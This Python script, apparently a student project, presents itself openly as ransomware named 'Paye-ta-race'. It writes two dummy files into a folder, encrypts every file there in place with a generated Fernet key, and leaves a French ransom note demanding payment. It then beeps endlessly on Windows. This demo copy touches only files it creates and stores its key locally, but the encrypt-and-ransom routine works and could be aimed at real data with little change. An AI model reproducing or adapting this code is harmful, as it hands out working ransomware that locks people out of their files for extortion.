from art import *
from termcolor import colored
print(colored (text2art("Paye-ta-race").center(60),'green'))
print(colored("ransomeware created by our network, Need4School".center(50),'cyan'))

import os
def create_dir(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory

def write_file(path,data):
    file = open(path,'w')
    file.write(data)
    return file
def remplir_repertoire(dir):
    with open(str(dir)+'/'+'file1.txt','w') as file :
        file.write("Ce contenu est très important...")
        file.write("les informations de nos chers clients...")
    with open(str(dir)+'/'+'file2.txt','w') as file :
        file.write("Ce contenu est très important...")
        file.write("les informations de nos chers clients...")
pwd=create_dir('files')
remplir_repertoire(pwd)

from cryptography.fernet import Fernet
items=os.listdir(pwd)
 
def generation_clef():
    clef=Fernet.generate_key()
    with open ("clef.key",'wb') as key_file:
        key_file.write(clef)
def lire_clef():
    return open('clef.key','rb').read()
def chiffrement(items,clef):
    f=Fernet(clef)
    for item in items :
        with open(item,'rb') as File:
            file_data=File.read()
        encrypted_data=f.encrypt(file_data)
        with open(item,'wb') as File:
            File.write(encrypted_data)
path=[str(pwd) + '/' + item for item in items]
generation_clef()
clef=lire_clef()
chiffrement(path,clef)
with open(str(pwd) + '/' + 'readme.txt','w') as file :
    file.write('PAYEEE !!! Donne mon argent !!!')

import time
import winsound
# Set frequency to 2000 Hertz
frequency = 600
# Set duration to 1500 milliseconds (1.5 seconds)
duration = 300

var1=True

while var1:
    # Make beep sound on Windows
    winsound.Beep(frequency, duration)
    time.sleep(2)